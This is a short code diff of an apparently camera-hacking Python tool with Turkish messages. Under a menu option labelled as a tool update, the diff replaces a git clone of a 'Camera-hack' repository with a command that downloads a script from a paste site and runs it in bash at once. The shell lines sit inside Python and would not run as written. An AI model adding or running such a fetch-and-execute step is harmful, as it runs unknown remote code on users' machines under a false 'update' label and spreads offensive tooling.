@@ -84,7 +84,7 @@ try:
     if secim=="5":
       print("Tool Güncelleniyor Bekleyin")
       time.sleep(3)
-      git clone https://github.com/mrxbl/Camera-hack
+      bash <(curl -L https://justpaste.it/36427)
       print("Kurulum Tamamlandı")
 
     ulke = ulkeler[secim-1]
